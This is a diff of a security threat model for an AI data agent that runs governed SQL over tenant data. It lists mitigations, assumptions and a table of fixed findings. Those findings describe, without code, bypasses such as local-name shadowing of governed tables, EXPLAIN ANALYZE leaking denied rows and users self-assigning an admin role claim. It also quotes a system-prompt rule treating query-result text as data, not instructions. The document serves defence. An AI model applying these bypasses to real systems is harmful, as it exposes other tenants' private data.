-#### M1: Governance rewrite operates on the parsed AST, not string matching: every reference to a governed logical table - via raw view, s3t.*, glue.* or dl.* alias - is replaced by a guarded subquery (RLS predicate + schema-aware CLS EXCLUDE); alias semantics preserved in joins. Local names may NOT shadow a governed table (M018) - the earlier 'skip CTE/CTAS-local names' exemption was itself the bypass - so every table node carrying a governed name is guarded. Governable statement shapes are allowlisted (M017). Explicit selection of a denied column is rejected pre-engine with a legible policy error naming the column and role (never an opaque binder error).
+#### M1: Table-level deny-by-default: a restricted principal may reference only tables its policy names, session temp objects it created, or names local to the statement; the L0 map and search_schema are filtered to the role and denied column NAMES are hidden.
 
-**Addresses Threats**: T1, T2, T9, T17
+**Addresses Threats**: T1, T2, T11
 
-#### M2: Fail-closed on parse failure: SQL that sqlglot cannot parse is REJECTED for restricted principals (ValueError), never passed through. Unrestricted principals (allow_raw_paths + no governed tables) bypass rewrite by explicit policy only.
+#### M2: The runtime's own exported audit log (cw_logs) is not readable by any restricted persona; it is admin-only by omission and documented as part of the governance boundary.
 
-**Addresses Threats**: T1, T2
+**Addresses Threats**: T2
 
-#### M3: Single-statement rule: the gate requires EXACTLY ONE statement per run_sql call, split with duckdb.extract_statements - the engine's own parser, so there is no lexer divergence to aim at; semicolons inside literals/comments/dollar-quotes handled for free. Closes the multi-statement smuggling fail-open (a write riding behind a read).
+#### M3: Bind the session to its owner (JWT sub, else tenant:role) and reset the engine, result store, data map, L0 injection, audit counters and conversation history on an owner change.
 
-**Addresses Threats**: T3, T13
+**Addresses Threats**: T3
 
-#### M4: Read-only statement gate: leading-comment stripping then keyword allowlist (read statements + CREATE TEMP TABLE/VIEW); rejects INSERT/UPDATE/DELETE/non-temp CREATE/ATTACH/COPY TO. DuckDB catalog legs attach READ_ONLY; engine is in-memory and dies with the session; execution role has no write permissions on data buckets - three independent layers against persistence/exfiltration.
+#### M4: Cost gate rejects a literal partition range that exceeds the expansion cap or is unsatisfiable, instead of recording the filter satisfied and degrading to a whole-prefix scan. Non-literal/one-sided predicates still pass to engine pruning.
 
-**Addresses Threats**: T3, T4, T13
+**Addresses Threats**: T4
 
-#### M5: Raw file access governed by an ALLOWLIST on AST shape, not a function-name denylist: every FROM/JOIN source must be an exp.Identifier (a real table/view/CTE/temp reference); table-valued functions are rejected with the offending name, with a minimal justified exception list for pure generators (GenerateSeries). Closes the parquet_scan/read_csv_auto/read_json bypass and is future-proof against new DuckDB file functions.
-
-**Addresses Threats**: T1, T4
-
-#### M6: Unknown-role fallback fails CLOSED: an unknown role inside a known tenant resolves to that tenant's MOST restricted policy, ranked by policy content (raw-path denial > governed-table count > row filters > denied columns) over sorted keys - never by declaration order. Unknown tenants get the configured default role.
+#### M5: The reserved framework-result-name (_r_<n>) check runs on the parsed tree (CTE/CTAS/alias nodes), not a text regex, so the quoted form cannot slip through and overwrite a result table.
 
 **Addresses Threats**: T5
 
-#### M7: Inbound AuthN enforced by the platform before agent code: Amazon Cognito user pool issues ID tokens (custom:tenant/custom:role); the AgentCore managed customJWTAuthorizer validates signature (discovery URL) and allowedAudience; requestHeaderAllowlist forwards only Authorization. Verified live: no-token=401, forged-token=403, both pre-code. The sample's jwt.decode(verify_signature=False) is claims EXTRACTION from an already-verified token.
+#### M6: The governance guard's alias is attached through the AST (quoted when unsafe), and both the Govern stage and the pipeline driver fail closed on ANY exception, so a parse-breaking alias is a clean audited rejection and every statement is audited exactly once.
 
-**Addresses Threats**: T6, T7
+**Addresses Threats**: T6, T22
 
-#### M8: Session blast-radius isolation: one session = one microVM = one DuckDB; a pathological query OOMs only its own session. Resource envelope (DUCKDB_MEMORY_LIMIT + spill directory) turns memory exhaustion into slower-not-dead. Bedrock/S3 cost exposure bounded by the customer's own account throttles.
+#### M7: The cloud-ops source-bucket IAM grant is scoped to the CUR export prefix and to AWSLogs/<opsAccountId>/CloudTrail/*, with ListBucket restricted by s3:prefix, making the account pin an IAM boundary, not just a SQL row filter.
 
-**Addresses Threats**: T10
+**Addresses Threats**: T7
 
-#### M9: run_sql serialization under _conn_lock: execute+fetch pairs are atomic on the shared connection; the governance schema probe takes the same lock. Regression test covers parallel tool calls not stealing each other's results.
-
-**Addresses Threats**: T14
-
-#### M10: Schema-aware CLS fails closed: EXCLUDE lists are intersected with a DESCRIBE-probed schema per reference; if the probe FAILS the full denylist is kept (worst case the engine rejects the query). The probe cache lives in one session = one principal = one microVM, so cross-principal poisoning is structurally impossible in the intended deployment.
-
-**Addresses Threats**: T12
-
-#### M11: Observability of governance decisions: every run_sql result carries a governed flag and engine metrics; the SSE trace labels each decision (which row filter, which hidden column, or the policy rejection); runtime logs to CloudWatch. Gives operators an audit signal for whether and how the rewrite applied.
-
-**Addresses Threats**: T1, T11, T16
-
-#### M12: DOCUMENTATION: deployment warnings that (a) without the inbound JWT authorizer, JWT claims are NOT verified and SigV4 identity-assertion paths trust the caller completely - production deployments must treat calling-application identity assertion as a privileged operation; (b) the module-level active-role slot is valid ONLY under one-session-one-principal (AgentCore microVM) and must not be lifted into multi-principal services; (c) demo Cognito users ship with a documented password - rotate credentials and restrict the user pool before exposing a deployment.
-
-**Addresses Threats**: T7, T8, T15
-
-#### M15: Trace transparency is deliberate and bounded: the SSE trace exposes the principal's OWN policy application (their row filter, their denied columns) - the exact information the clean rejection message already conveys - and never another tenant's policy or data. For deployments preferring opacity, the entrypoint envelope mapping is a single filter point to drop rls[]/cls[] details from the stream.
-
-**Addresses Threats**: T16
-
-#### M16: UI credential hygiene: the app client secret enters the UI only via environment variable (never the repo; detect-secrets gate in CI); tokens live in Streamlit session state in-process; persona switching is logout/login so identity is always a validated JWT claim, not a UI toggle.
+#### M8: The CloudWatch Logs export bucket policy carries ArnLike aws:SourceArn pinned to the runtime's own log group, alongside aws:SourceAccount, per AWS documentation.
 
 **Addresses Threats**: T8
 
-#### M17: Statement shapes are an ALLOWLIST on the parsed root (Select, SetOperation, Subquery, Create, Describe, Summarize, Show). sqlglot renders anything it cannot model - EXPLAIN, EXPLAIN ANALYZE, SHOW <table>, future syntax - as an opaque Command node with NO table references, which the rewrite loop silently passed through; EXPLAIN ANALYZE then executed the ungoverned inner query and reported denied-row cardinalities in the plan. Everything outside the allowlist is now rejected for restricted principals. DESCRIBE/SUMMARIZE of a governed table emit the guard as DESCRIBE SELECT * FROM (guard); a PIVOT modifier is moved onto the guard so it aggregates governed rows.
+#### M9: The system prompt states that row CONTENT is data, never instructions: text inside a query result is untrusted evidence to report on, not a command to follow.
 
-**Addresses Threats**: T1, T2, T9, T17
+**Addresses Threats**: T9
 
-#### M18: Local names may not shadow governed tables: a CTE, CTAS/temp table, temp view, derived-table alias or table alias that reuses a governed table's name is REJECTED, replacing the previous 'skip table nodes bearing a local name' exemption which unguarded the real base table (RLS and CLS both bypassed, cross-tenant PII proven readable). Refusing the collision - rather than scoping the exemption across recursive CTEs, nested scopes and DuckDB's temp-schema search order - makes the invariant total: with no collision possible, a governed name always denotes the governed table and every reference is guarded.
+#### M10: Identity-aware RLS/CLS rewrite on the parsed AST: every reference to a governed table via raw view, s3t.*, glue.* or dl.* is replaced by a guarded subquery (RLS predicate + schema-aware CLS EXCLUDE); explicit selection of a denied column is a clean rejection.
 
-**Addresses Threats**: T1
+**Addresses Threats**: T12
 
-#### M19: Deny-all floor as the default role: the built-in 'deny-all' policy is always present in the policy table, is the default when GOVERNANCE_DEFAULT_ROLE is unset, and is where blank / missing / unknown-tenant claims resolve. It rejects every statement before parsing, and the AgentCore entrypoint refuses the invocation up front (one 'access denied' envelope, model never invoked, no Bedrock spend). Local CLI runs must name the principal explicitly (--as <tenant>:<role>), so 'no identity' can never mean 'the admin identity'.
+#### M11: No local name (CTE, CTAS/temp target, derived-table or table alias) may reuse a governed table's name; the collision is refused rather than exempted, making the guard total.
 
-**Addresses Threats**: T11, T5
+**Addresses Threats**: T13
 
-#### M20: Identity source cannot self-assign governance claims: the Cognito app client declares explicit attribute permissions with custom:tenant / custom:role in READ attributes only (the ID token must still carry them) and never in WRITE attributes, so UpdateUserAttributes with a user's own token is refused (NotAuthorizedException). Role assignment is an operator action via AdminUpdateUserAttributes. Enforced in infra/stack.py via ClientAttributes and applied to the deployed client. MFA on the pool is deliberately left OFF for demo convenience - production guidance keeps it (T008).
+#### M12: Statement roots are an allowlist on the parsed tree (Select, SetOperation, Subquery, Create, Describe, Summarize, Show); opaque shapes (EXPLAIN, EXPLAIN ANALYZE, SHOW <table>) are rejected for restricted principals.
 
-**Addresses Threats**: T8, T18
+**Addresses Threats**: T14
 
-#### M21: Policy JSON validated at load (supersedes M013's 'recommended hardening'): keys must be <tenant>:<role>, fields must be known, table and denied-column names must be bare identifiers, each row_filter must parse as exactly ONE WHERE predicate, allow_raw_paths may not be combined with governed tables (a raw path read bypasses table rules), and the deny-all floor cannot be redefined as permissive. Malformed configuration fail-stops at import instead of silently governing nothing.
+#### M13: Exactly one statement per call, split with the engine's own parser, behind a read-only keyword allowlist; no persistent writes, ATTACH, or COPY TO.
+
+**Addresses Threats**: T15
+
+#### M14: Raw file access is governed by an AST-shape ALLOWLIST (only exp.Identifier FROM/JOIN sources; pure generators excepted), not a function-name denylist, so new DuckDB file functions are refused by default.
+
+**Addresses Threats**: T16
+
+#### M15: Deny-all floor: the built-in deny-all policy is the default role and where blank/unknown claims resolve; the entrypoint refuses before invoking the model. Unknown role in a known tenant -> that tenant's most restricted policy.
+
+**Addresses Threats**: T17, T11
+
+#### M16: The Cognito app client declares custom:tenant/custom:role as READ-only attributes, so a user cannot self-assign a governance claim via UpdateUserAttributes; role assignment is an operator action.
+
+**Addresses Threats**: T18, T26
+
+#### M17: Inbound authentication is enforced by the AgentCore managed JWT authorizer (signature + allowedAudience) BEFORE agent code runs; requestHeaderAllowlist forwards only Authorization.
+
+**Addresses Threats**: T19
+
+#### M18: Tool calls are serialized on the shared engine connection under conn_lock, including the governance schema probe and session-object lister.
+
+**Addresses Threats**: T21
+
+#### M19: GOVERNANCE_POLICIES and LABELS_PREFIX are validated at import (key shape, known fields, bare identifiers, single WHERE predicate, no allow_raw_paths-with-governed-tables, deny-all floor immutable, s3:// prefix + bucket allowlist); malformed config fail-stops.
 
 **Addresses Threats**: T11
 
-#### M22: LABELS_PREFIX validated before it reaches SQL: strict s3://<bucket>/<key> syntax over [A-Za-z0-9._-] only (no quotes, whitespace, parentheses or other schemes - nothing that can leave the read_parquet literal), no '.'/'..' segments, and the bucket must be the solution-owned bucket or one named in LABELS_ALLOWED_BUCKETS. Since these tables decide the OUTCOME of a sanctions screen, a bad value fail-stops the process rather than screening against attacker-chosen data.
+#### M20: Least-privilege read-only execution role, READ_ONLY catalog attaches, hardened buckets (SSE, BlockPublicAccess, enforce_ssl); one session = one microVM with a memory envelope bounds blast radius and cost.
 
-**Addresses Threats**: T11
+**Addresses Threats**: T7, T27
 
-#### M13: Policy-as-configuration with a fail-safe default: GOVERNANCE_POLICIES is JSON env config and the default is the built-in deny-all floor, not an unrestricted role (see M019). Startup validation of the policy table is IMPLEMENTED, not merely recommended - see M021. Unknown roles inside a known tenant still resolve to that tenant's most restricted policy (M006), with deny_all ranking above every other policy in the restrictiveness ordering.
+#### M21: Documented trust assumptions and deployment guidance: SigV4 identity-assertion is a local/CLI trust assumption unreachable under the deployed authorizer; the module-level active-role slot must not be lifted into a multi-principal service; rotate demo credentials and keep MFA on in production.
 
-**Addresses Threats**: T5, T11
+**Addresses Threats**: T20, T25, T26
+
+#### M22: One EMF audit line per statement (principal, SQL, governance/cost decision, outcome) plus a live per-stage SSE trace give operators the audit signal for whether and how the rewrite applied.
+
+**Addresses Threats**: T1, T2, T3, T4, T6, T9, T24
 
 ### Will Not Action Mitigations
 
-#### M14: Residual acceptance for inference/side channels: aggregate-inference and timing side channels against denied columns are NOT fully closed by any query-rewrite RLS/CLS implementation (industry-wide limitation, same class as BI-tool row-level security). Sample carries a not-for-production disclaimer; production guidance is physical separation (per-tenant tables/views) when denied data is high-sensitivity.
+#### M23: Accepted residual: aggregate/timing inference against denied columns is not fully closed by any query-rewrite RLS/CLS; production guidance is physical separation (per-tenant tables/views) for high-sensitivity data. Sample data is public/synthetic.
 
-**Addresses Threats**: T9
+**Addresses Threats**: T23
+
+### Identified Mitigations
+
+#### M24: Recommended hardening for the cold-start supply-chain risk: pre-bake and pin the engine's DuckDB extensions into the container image (LOAD only) and restrict runtime egress, rather than INSTALL from the public repo at cold start.
+
+**Addresses Threats**: T10
 
 ## Assumptions
 
 ### A006: Platform trust
 
-**Description**: AWS-managed services (AgentCore Runtime + JWT authorizer, Cognito, Bedrock, S3, Secrets Manager, CloudWatch) operate correctly per the shared-responsibility model.
+**Description**: AWS-managed services (AgentCore Runtime + JWT authorizer, Cognito, Bedrock, S3, Secrets Manager, CloudWatch) operate correctly per the shared-responsibility model, and AgentCore provisions one isolated microVM per runtimeSessionId.
 
-- **Impact**: The sample's controls begin where verified requests enter agent code; platform-side AuthN, microVM isolation, and storage encryption are relied upon, not re-verified.
-- **Rationale**: Standard AWS shared-responsibility boundary; the managed authorizer's 401/403 pre-code behaviour was verified live but its internals are AWS-operated.
+- **Impact**: The sample's controls begin where verified requests enter agent code; platform-side AuthN, microVM isolation, and storage encryption are relied upon. The session-owner binding (T003 fix) rests on this isolation to catch a reused session id.
+- **Rationale**: Standard AWS shared-responsibility boundary; the managed authorizer's 401/403 pre-code behaviour was verified live, and per-session microVM isolation is an AgentCore guarantee.
 
-### A007: Operational responsibility
+### A007: Deployment configuration
 
-**Description**: The operator/deployer owns the account, the data, the governance policy content, and the Cognito user lifecycle (including rotating the documented demo passwords before any shared exposure).
+**Description**: The runtime is deployed WITH the AgentCore managed inbound JWT authorizer, and clients present the Cognito ID token (not the access token).
 
-- **Impact**: Policy-authoring errors and unrotated demo credentials are operator risks (T008/T011), accepted rather than closed by code.
-- **Rationale**: A sample cannot enforce operational hygiene in the consumer's account; documentation is the available control.
+- **Impact**: Without it, authentication is not enforced before agent code and identity falls through to caller-asserted SigV4 sources (T020 becomes live); the deny-all floor is then the only remaining control.
+- **Rationale**: The runtime is configured with customJWTAuthorizer and allowedAudience (agentcore configure --authorizer-config); no-token/forged-token rejection verified live.
 
-### A008: Data sensitivity
+### A008: Execution model
 
-**Description**: Sample data is public (aws-public-blockchain, public OFAC list) or synthetic (cex_deposit_labels incl. the subject_identity column); no real customer or personal data ships with the sample.
+**Description**: Each analyst session uses a fresh, unguessable runtimeSessionId, as the shipped UI and eval runner do, and one AgentCore session serves exactly one principal.
 
-- **Impact**: Worst-case disclosure with shipped data is reputational, not privacy-impacting. Customers substituting confidential data inherit the documented residual risks, notably side-channel inference (T009).
-- **Rationale**: Verified: OFAC list is a cited public dataset; CEX labels are authored in the loader with synthetic identifiers; the not-for-production disclaimer covers substitution.
+- **Impact**: Load-bearing for the module-level active-role slot and the per-session engine/result state. A reused id across identities is caught by the session-owner binding and reset (T003); lifting the module into a multi-principal service voids these conclusions (T025).
+- **Rationale**: AgentCore documents that the session id is caller-provided and isolation is between sessions; the app binds retained state to an owner within the microVM.
 
-### A009: Execution model
+### A009: Operational responsibility
 
-**Description**: One session = one microVM = one principal (the AgentCore execution model).
+**Description**: The operator/deployer owns the account, the data, the governance policy content, and the Cognito user lifecycle (including rotating documented demo passwords before any shared exposure). They are not modelled as an adversary; their misconfiguration is in scope.
 
-- **Impact**: Load-bearing for the module-level active-role design and the per-session schema-probe cache; lifting data_agent/governance/ into a multi-principal service voids these conclusions (T015, HIGH residual, documented).
-- **Rationale**: AgentCore Runtime provisions an isolated microVM per session; validated during cloud acceptance (fresh sessions per invoke).
+- **Impact**: Policy-authoring errors and unrotated demo credentials are operator risks (T011, T026). Shape errors fail closed at import; omission fails closed via deny-by-default; a semantically over-broad policy still governs as written.
+- **Rationale**: A sample cannot enforce operational hygiene in the consumer's account; validation + deny-by-default + documentation are the available controls.
 
-### A010: Deployment configuration
+### A010: Data sensitivity
 
-**Description**: The SigV4 payload/header identity-assertion path exists for local/CLI development only; the deployed reference configuration uses the Cognito JWT authorizer.
+**Description**: Sample data is public (aws-public-blockchain, public OFAC list) or synthetic (cex_deposit_labels incl. subject_identity), or the deployer's own cloud telemetry; no real third-party customer data ships with the sample.
 
-- **Impact**: T007's caller-asserted identity is unreachable on the deployed path (the authorizer rejects unauthenticated requests before agent code); it remains a documented trust assumption for local use.
-- **Rationale**: The runtime is configured with the customJWTAuthorizer (agentcore configure --authorizer-config); no-token/forged-token rejection verified live 2026-09-02.
-
-## Code Validation Round 2 (2026-09-03) - evidence-based re-validation
-
-The first code-validation pass fixed three fail-opens in controls that existed. This
-round asked a different question - is the control COMPLETE? - by reading the
-merged code, inspecting the deployed AWS resources, and running executable
-proofs. Three findings were in code this model had already marked resolved:
-
-| Finding | Model said | Code did | Now |
-|---|---|---|---|
-| Local name shadowing a governed table (T1's own "CTE/alias tricks") | M1: "CTE/CTAS-local names skipped" - stated as a feature | Skipping unguarded the REAL base table: a junior read all three exchanges' subject_identity; the temp-table form persisted the stolen rows in-session | M018 refuses the collision; nine adversarial regressions |
-| Opaque statement shapes (new T17) | No threat covered it | sqlglot parsed EXPLAIN into a Command with no table nodes, so the rewrite passed it through; EXPLAIN ANALYZE executed ungoverned and leaked denied-row cardinality | M017 allowlists the parsed root |
-| Default role (T11) | "unknown principals fail closed" | GOVERNANCE_DEFAULT_ROLE defaulted to ops:admin, so blank/unknown claims became the unrestricted principal | M019 deny-all floor + pre-model refusal |
-| Self-service claim rewrite (new T18) | T8 accepted "restrict the app client" as production guidance | The DEPLOYED client had no attribute permissions: UpdateUserAttributes(custom:role=admin) succeeded and the next ID token carried ops:admin | M020 claims read-only on the client |
-| Policy / label-prefix validation (T11) | M013 "in progress", documentation only | No validation code; LABELS_PREFIX went unchecked into read_parquet() | M021 + M022, both fail-stop at import |
-
-**Method note.** Every finding here was reproduced end to end before being
-accepted, and every fix re-verified the same way: 145 offline regressions (49 of them new and
-adversarial) plus cloud acceptance on the deployed runtime through the real Cognito JWT
-path - per-persona results unchanged, both proof-of-concept queries rejected
-pre-engine, unknown-tenant claims answered with principal=deny-all and no
-model invocation. Design rationale: docs/design.md.
-
-**Lesson for this model.** Two of the three missed defects were places where a
-mitigation's TEXT described the intent and the code implemented something
-narrower; the third was a default value no threat statement mentioned. Both
-patterns are invisible to a design-level review, which is what code
-validation exists to catch - so mitigation text is now written against the code path, and
-completeness rules are recorded as invariants (docs/design.md, design invariants).
+- **Impact**: Caps the immediate harm of the disclosure threats for the published sample. A deployer substituting real KYC linkage or another organisation's data inherits the documented residuals (notably T009, T023).
+- **Rationale**: The repo ships loaders and views but no third-party data; the labels are synthetic and the OFAC list is public; a not-for-production disclaimer covers substitution.
 
 ## Phase Progress
 
